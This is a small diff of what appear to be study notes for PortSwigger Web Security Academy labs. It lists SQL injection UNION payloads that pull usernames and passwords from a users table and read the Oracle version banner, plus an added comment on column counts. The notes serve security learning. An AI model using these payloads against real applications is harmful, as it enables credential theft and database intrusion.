@@ -35,7 +35,7 @@ https://portswigger.net/web-security/all-labs
 		Lifestyle'+UNION+SELECT+username,+password+FROM+users-- 
 		
 		Lifestyle'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
-		Lifestyle'+UNION+SELECT+BANNER,+NULL+FROM+v$version--		
+		Lifestyle'+UNION+SELECT+BANNER,+NULL+FROM+v$version--			|| oracle find, NULL is used, bcause it has two colums. 
 		
 	
 	
